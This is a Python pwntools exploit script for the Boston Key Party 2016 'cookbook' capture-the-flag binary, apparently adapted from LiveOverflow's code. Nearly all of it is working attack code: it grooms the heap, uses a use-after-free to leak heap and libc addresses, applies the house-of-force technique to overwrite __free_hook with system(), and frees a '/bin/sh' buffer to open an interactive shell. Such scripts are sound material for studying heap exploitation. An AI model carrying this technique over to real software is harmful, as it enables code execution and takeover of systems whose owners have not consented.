# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Based on the LiveOverflow's code
#

import ctypes
import re

from pwn import *

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# from the binary
FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c
PRINTF_OFFSET = libc.symbols['printf']
SYSTEM_OFFSET = libc.symbols['system']

# will calculate from the leaked addresses
FREE_HOOK_PTR = 0
LIBC = 0

#r = remote('localhost', 8888)
r = process('./cookbook')

#p32 = lambda x: struct.pack("I", x)

def stou(i):
    return ctypes.c_uint32(i).value

def send(msg):
    r.send(msg + '\n')

def recv_all():
    return r.recv()

def fill_heap(nr):
    for i in xrange(0, nr):
        send("g")
        send(hex(0x5))
        send(p32(0xdeadbeef))

def add_leak(addr, groom=0x200):
    if groom > 0:
        fill_heap(groom)

    send("c")
    send("n")
    send("g")
    send("xxx")

    send("d")
    send("q")

    send("a")
    send("n")
    send("g")
    send("AAAA1111")
    send("e")
    send("q")

    send("c")
    send("g")
    OVERWRITE = "AAAABBBBCCCC" + p32(addr) + p32(0x00000000)
    send(OVERWRITE)
    send("q")

def parse_ingredient():
    r.clean()
    send("l")
    resp = recv_all()

    print resp

    li = resp.split("------")
    last = li[-2]

    m = re.search("calories: ([ +-]\d+)", last)
    return stou(int(m.groups()[0]))

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    send("babo")

    #
    # leak the address of TOP CHUNK
    #
    send("c")
    send("n")
    send("a")
    send("basil")
    send("0")
    send("p")
    send("d")
    r.clean()
    send("p")
    resp = recv_all()
    print resp
    LEAKED_TOP_CHUNK_ADDR = int(resp.split("\n")[3].split("-")[0])
    send("q")
    print "LEAKED_TOP_CHUNK_ADDR: 0x{:08x}".format(LEAKED_TOP_CHUNK_ADDR)

    raw_input("continue?")

    #
    # calc LIBC_BASE
    #
    print "add address 0x{:08x} from printf@GOT to leak.".format(0x804d010)
    add_leak(0x804d010, groom=0x200)
    leaked = parse_ingredient()
    print "printf@GOT: 0x{:08x}".format(leaked)
    LIBC = leaked - PRINTF_OFFSET
    print "libc base address: 0x{:08x}".format(LIBC)

    raw_input("continue?")

    FREE_HOOK_PTR = LIBC + FREE_HOOK_OFFSET
    print "trying to leak free_hook address from 0x{:08x}".format(FREE_HOOK_PTR)
    add_leak(FREE_HOOK_PTR, groom=0x200)
    leaked = parse_ingredient()
    FREE_HOOK = leaked
    print "free_hook address: 0x{:08x}".format(FREE_HOOK)

    fill_heap(0x100)

    raw_input("continue?")

# house of force

    print "create another stale recipe pointer"
    send("c")
    send("n")
    send("d")
    send("q")

    raw_input("continue?")

    print "create a ingredient and remove one"
    send("a")
    send("n")
    send("q")

    raw_input("continue?")

    # top chunk has been shrunken as the result of a series of malloc operations.
    # used gdb to calc the offset 0x4ddc
    HEAP_WILDERNESS = LEAKED_TOP_CHUNK_ADDR + 0x4ddc
    print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)

    raw_input("continue?")

    print "use after free recipe overwriting the wilderness with 0xFFFFFFFF"
    send("c")
    send("g")
    send(p32(0x0) + p32(0x0) + p32(0xFFFFFFFF) + p32(0x0))
    send("q")

    raw_input("continue?")

    MAGIC_MALLOC = FREE_HOOK - 4*2 - HEAP_WILDERNESS
    print "magic malloc: 0x{:08x}".format(MAGIC_MALLOC)

    send("g")
    send(hex(MAGIC_MALLOC))
    send("X")

    raw_input("continue?")

    print "free_hook: 0x{:08x}".format(FREE_HOOK)
    print "overwrite free_hook with system() 0x{:08x}".format(LIBC+SYSTEM_OFFSET)
    send("g")
    send("0x5")
    send(p32(LIBC+SYSTEM_OFFSET))

    raw_input("continue?")

    send("g")
    send("0x8")
    send("/bin/sh\x00")
    send("R")

    r.clean()

    r.interactive()
